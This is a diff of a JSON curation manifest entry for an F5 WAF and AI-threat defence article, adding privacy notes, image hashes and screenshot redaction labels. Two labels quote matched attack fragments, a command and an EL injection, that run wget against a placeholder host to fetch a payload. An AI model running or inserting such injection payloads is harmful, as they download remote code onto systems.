@@ -8238,7 +8238,97 @@
   "77276": {
     "article_hash": "5244514d878667a255fd9dfe9ed2bcdb296e4efc11f597bf746d19f675532346",
     "decision": "include",
-    "reason": "Distributed Cloud integrated WAF, API, bot and behavioral defenses for AI threats"
+    "reason": "Distributed Cloud integrated WAF, API, bot and behavioral defenses for AI threats",
+    "text_replacements": {
+      "nodes": {
+        "88d2c314710744b31bc98dfe2db022a4ab306983e32884a6c28c71d1b8b936f3": "This is the answer to the actor that\u2019s clean at every checkpoint: no single layer had to catch it, because the platform was never relying on a single layer. (This also solves a classic dilemma \u2014 acting on WAF signals before you\u2019re confident enough for blocking mode. An F5 colleague shows how to use Malicious User Mitigation exactly that way "
+      },
+      "output_sha256": "fc6b2eda9fe401e43a3037bb263c6015d9f8e27ef7a51a84fab24958d2e95ca5"
+    },
+    "privacy": "approved",
+    "privacy_reason": "Individually inspected full-stack AI security guide and all five images; malicious source IP, payload endpoint, incident ID and authority made synthetic; BOLA user already uses reserved example email and object UUID; risk scores, signature descriptions and bot category counts retained",
+    "assets": {
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/0/0/00cc891b86618fb31abc94c19dab7b37888a319c.png": "bafb23fe8ecc2a6e9bbcd2e1b59187caba13cd2347d0c199c9ed2d99fdd4e31c",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/0/6/069641d09680e8e73f0d33ac7f7d80be7d9986f1.png": "bc2c52f82e1ee81d6fba8830d1037d3626ad7dbf802385c410ecabc13473e792",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/4/c/4c7fde4dfd3620038957013908873ef07b207dd9.png": "b991a0b378d891f0ff36d84616a108322a5ea41ff32b70803a2524539ebeeb9f",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/e/d/ede893d63c69baf394838fa15d347dc4d7a5725b.png": "1c23d5a777a2b1785ce7091ce368efb995a93bde63334b9bba5bc5844a802249",
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/f/5/f5d1372a9e007b08618e1f3f00a0271f59072049.png": "cf3d8a4e16c969dc186b5ca56b3690ae7e14662964cda1b52ef004339e182821"
+    },
+    "asset_redactions": {
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/0/0/00cc891b86618fb31abc94c19dab7b37888a319c.png": {
+        "rectangles": [],
+        "labels": [
+          {
+            "rectangle": [
+              937,
+              367,
+              1494,
+              409
+            ],
+            "text": "Matched attack fragment: exec(\"wget -qO - http://192.0.2.10/payload\")",
+            "size": 12
+          },
+          {
+            "rectangle": [
+              937,
+              825,
+              1494,
+              866
+            ],
+            "text": "Matched EL injection: Runtime.getRuntime().exec(\"wget http://192.0.2.10/payload\")",
+            "size": 12
+          }
+        ],
+        "output_sha256": "9a613d794c0dcbccefa0544c829e41c15c233f05dea1d19af1d6dd633e2515c2"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/0/6/069641d09680e8e73f0d33ac7f7d80be7d9986f1.png": {
+        "rectangles": [],
+        "labels": [
+          {
+            "rectangle": [
+              1095,
+              101,
+              1250,
+              138
+            ],
+            "text": "192.0.2.10",
+            "size": 20
+          }
+        ],
+        "output_sha256": "6a50f163c2062ec283b1548f106ba19bef15565f83c2d20c398423ba2bb99536"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/e/d/ede893d63c69baf394838fa15d347dc4d7a5725b.png": {
+        "rectangles": [],
+        "labels": [
+          {
+            "rectangle": [
+              299,
+              923,
+              758,
+              956
+            ],
+            "text": "00000000-0000-4000-8000-000000000001",
+            "size": 18
+          },
+          {
+            "rectangle": [
+              299,
+              961,
+              624,
+              995
+            ],
+            "text": "api.example.com",
+            "size": 18
+          }
+        ],
+        "output_sha256": "6d3c28b8cb77d4bb29653996fcac3e1f12ebc1c1b3b1edeb1d77227a6a9ac73f"
+      },
+      "https://d20hrnpixdzcsd.cloudfront.net/original/3X/4/c/4c7fde4dfd3620038957013908873ef07b207dd9.png": {
+        "strip_metadata": true,
+        "rectangles": [],
+        "output_sha256": "74c13af491bae71b859a3ace8138bf5e99c9e01d75512ef2b182ff5a072d7b67"
+      }
+    }
   },
   "77329": {
     "article_hash": "575749f83ee04909cf77a3a0c90724f7681b0aeaffaeebfa89a5b14b99f75d53",
